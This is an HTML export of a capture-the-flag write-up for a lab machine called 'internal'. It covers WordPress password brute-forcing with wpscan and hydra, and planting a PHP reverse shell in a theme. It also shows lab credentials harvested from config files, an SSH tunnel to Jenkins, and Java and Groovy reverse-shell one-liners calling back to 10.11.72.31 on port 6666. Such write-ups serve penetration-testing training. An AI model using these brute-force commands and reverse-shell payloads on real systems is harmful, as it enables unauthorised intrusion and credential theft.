<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>internal</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>internal</h1><br/><strong>Internal</strong><br /><br />We do nmap scan to find only 2 ports open 22 and 80<br />Running standard SSH and Webserver.<br /><br />We add the IP to hosts file as internal.htm<br /><br />10.10.41.53     internal.thm<br /><br /><br />Next we enumerate hidden directories using gobuster.<br /><br /><img src="images/13-1.png" alt="images/13-1.png" /><br /><br />We see one post from admin in the <strong>/blog</strong> page. (Confirming a user named admin)<br />We confirm it uses wordpress from <strong>wappalyzer</strong> app of firefox and also view source.<br />The Blog directory has a login page of wp-admin.<br /><br />However, we do not have any credentials yet.<br />From here there are 2 options:<br /><br />1. Use wp-scan tool and finally bruteforce with it [Selected]<br />OR<br />2. Directly bruteforce with hydra<br /><br /><br /><strong><span style="text-decoration:underline;">Using wpscan:</span></strong><br /><br /><em><strong>wpscan --url http://internal.thm/blog</strong></em><br />This will do a initial scan to find any known vulnerabilities.<br /><br /><em><strong>wpscan --url http://internal.thm/blog -e u</strong></em><br />This will enumerate the users. We find an user named <strong>admin</strong>. As found earlier<br /><br />Then we bruteforce using wpscan<br /><em><strong>wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 100<br /></strong></em><strong>Note:</strong> We can use <em>-U or --usernames</em> and <em>-P or ---passwords</em><br /><br />The process is very slow and time taking hence we increase thead count by <em>--max-threads 100<br /></em><br /><br />We crack the password:<br />Username	:	admin<br />Password		:	my2boys<br /><br />We login to the wp-admin area. In the dashboard we see posts.<br />One Private Post revealed a credential: 	<br /><em><strong>Don&#39;t forget to reset Will&#39;s credentials. william:arnold147</strong></em><br /><br />We save it for later after checking the ssh login. <em>It is never used in this CTF</em><br /><br /><br />Next,<br />1. We focus on the apperance → edit theme <br />And select any php page.  Edit/remove its content and paste a php-reverse-shell code with proper IP and Port<br /><br />2. Start netcat listener<br /><br />3.<br /><strong>Note:</strong> The most important aspect is finding this page to trigger the reverse shell.<br />Location is follows:<br /><br /><em><strong>http://internal.thm/wordpress/wp-content/themes/twentyseventeen/***.php</strong></em><br /><strong>Note:</strong> whichever page we have edited, replace the *** with that page.<br /><br />eg.<br /><em><strong>http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php<br /></strong></em>if edited 404.php<em><strong><br />http://internal.thm/wordpress/wp-content/themes/twentyseventeen/archive.php</strong></em><br />If edited archive.php<br /><br />Once we open the exploited pages, we will get a connection as www-root with no access to user or root flag.<br /><br /><strong>Upgrading to higher privilege user:</strong><br />From the initial access we can download and runs <strong>LinPEAS.sh</strong> for privilege escalation. We find we intresting files.<br />We also discover that root login is permitted in SSH provided we have the password.<br /><br />1.<br />/etc/phpmyadmin/config-db.php<br /><br />&lt;?php<br />##<br />## database access settings in php format<br />## automatically generated from /etc/dbconfig-common/phpmyadmin.conf<br />## by /usr/sbin/dbconfig-generate-include<br />##<br />## by default this file is managed via ucf, so you shouldn&#39;t have to<br />## worry about manual changes being silently discarded.  *however*,<br />## you&#39;ll probably also want to edit the configuration file mentioned<br />## above too.<br />##<br />$dbuser=&#39;phpmyadmin&#39;;<br />$dbpass=&#39;B2Ud4fEOZmVq&#39;;<br />$basepath=&#39;&#39;;<br />$dbname=&#39;phpmyadmin&#39;;<br />$dbserver=&#39;localhost&#39;;<br />$dbport=&#39;3306&#39;;<br />$dbtype=&#39;mysql&#39;;<br /><br />The file has username and password for phpmyadmin.<br />We login through <em><strong>http://internal.thm/phpmyadmin</strong></em><br />We can see the phpmyadmin database, but didn&#39;t find anything useful.<br /><br />2.<br />/etc/wordpress/config-localhost.php<br />&lt;?php<br />define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);<br />define(&#39;DB_USER&#39;, &#39;wordpress&#39;);<br />define(&#39;DB_PASSWORD&#39;, &#39;wordpress123&#39;);<br />define(&#39;DB_HOST&#39;, &#39;localhost&#39;);<br />define(&#39;DB_COLLATE&#39;, &#39;utf8_general_ci&#39;);<br />define(&#39;WP_CONTENT_DIR&#39;, &#39;/var/www/html/wordpress/wp-content&#39;);<br />?&gt;<br /><br />We can again login to <em><strong>http://internal.thm/phpmyadmin</strong></em> using the above credentials.<br />We can see the wordpress database, but didn&#39;t find anything useful.<br /><br />3.<br />/opt/wp-save.txt<br />Bill,<br /><br />Aubreanna needed these credentials for something later.  Let her know you have them and where they are.<br /><br /><em><strong>aubreanna:bubb13guM!@#123</strong></em><br /><br /><br />Finally, we find user crendentials in the text file.<br />Now we can SSH into the machine using the above.<br /><br />Then we get the user flag in <strong>aunreanna</strong> home folder<br /><br /><br /><br /><strong>Root Privilege Escalation:</strong><br />There is one more intresting file in the home folder.<br /><br /><em><strong>cat jenkins.txt</strong></em><br />Internal Jenkins service is running on 172.17.0.2:8080<br /><br />This tells us that a local jenkins server is running in a container.<br /><br /><em><strong>netstat -tan | grep 8080</strong></em><br />The above command checks the connections and confirms that 127.0.0.1:8080 is indeed accessible for localhost only.<br /><br />The way around this is using SSH Tunneling.<br /><br /><em><strong>ssh -L 9999:172.17.0.2:8080 aubreanna@internal.thm<br />ssh -L 9999:127.0.0.1:8080 aubreanna@internal.thm</strong></em><br /><br />we can use anyone of the them and once we login. Our target machine can access the Jenkins server page by<br /><em><strong>http://localhost:9999</strong></em><br /><br />We have a jenkins login page. However, any of the old passwords we found didn&#39;t work.<br />Then,<br />We tried test:test and admin:admin<br />It gave a clue, stating admin is indeed an user<br /><br />Finally we will bruteforce this login page using hydra:<br /><br />We capture a login post request using burpsuite to get the 2 components for hydra<br />we get the 3rd component from login error. <br /><br />1. /j_acegi_security_check<br />2. j_username=admin&amp;j_password=bazinga&amp;from=%2F&amp;Submit=Sign+in<br />3. Invalid username or password<br /><br /><br />Then the following is our crafted hydra syntax:<br /><br /><em><strong>hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9999 127.0.0.1 http-post-form &quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password&quot; -vv</strong></em><br /><br />We get the credentials for Jenkins as:<br /><br />User: admin<br />Pass: spongebob<br /><br />Once inside jenkins dashboard, go to mange -→ script console<br /><br />Here we can use either groovy code or java code for reverse shell and click on run once we are ready with a listner.<br /><br /><strong>JAVA:</strong> (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)<br /><em><strong>r = Runtime.getRuntime()<br />p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.11.72.31/6666;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])<br />p.waitFor()</strong></em><br /><br /><strong>GROOVY:</strong> (https://cybexray.github.io/revshell/revshell.html)<br /><em><strong>String host=&quot;10.11.72.31&quot;;int port=6666;String cmd=&quot;/bin/sh&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</strong></em><br /><br />We will get a shell in our listner with the user <strong>jenkins</strong>.<br /><strong>Note:</strong> We are now accessing the containerized environment.<br /><br />We find an intresting text file inside /opt<br /><em><strong>cat /opt/note.txt</strong></em><br /><br />root:tr0ub13guM!@#123<br /><br />This files contains the root password for the internal.thm machine.<br /><br />We <strong>ssh</strong> as root using the credentials found here and retrieve the root flag.<br /><br />Thanks!!</div>
</body>
</html>
